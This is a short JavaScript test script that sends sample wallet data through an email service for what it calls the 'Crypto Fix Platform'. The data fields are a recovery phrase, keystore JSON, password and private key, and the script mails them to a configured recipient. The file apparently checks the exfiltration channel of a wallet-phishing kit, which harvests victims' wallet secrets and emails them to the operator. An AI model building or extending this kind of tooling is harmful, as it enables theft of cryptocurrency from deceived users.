// Test email sending functionality
import { sendWalletData } from '../emailService.js';
import config from '../config.js';

// Sample wallet data
const testData = {
  walletType: 'Metamask (Test)',
  accessType: 'Phrase',
  selectedService: 'Email Test',
  phrase: 'This is a test email from the Crypto Fix Platform',
  keystoreJson: '',
  password: '',
  privateKey: ''
};

console.log('Sending test email to:', config.recipient);
console.log('Using email credentials:', config.emailUser);

// Send the test email
sendWalletData(testData)
  .then(() => {
    console.log('\x1b[32m%s\x1b[0m', '✓ Test email sent successfully!');
    console.log('If you did not receive the email, please check:');
    console.log('1. Your .env file has the correct EMAIL_USER and EMAIL_PASS');
    console.log('2. If using Gmail, ensure you\'re using an App Password');
    console.log('3. Check your spam folder');
  })
  .catch((error) => {
    console.error('\x1b[31m%s\x1b[0m', '✗ Failed to send test email:');
    console.error(error);
    
    if (error.code === 'EAUTH') {
      console.log('\nAuthentication error. This typically means:');
      console.log('- Your email or password in .env is incorrect');
      console.log('- If using Gmail, you need to create an App Password:');
      console.log('  1. Go to https://myaccount.google.com/security');
      console.log('  2. Enable 2-Step Verification if not already enabled');
      console.log('  3. Create an App Password and use it in your .env file');
    }
  });
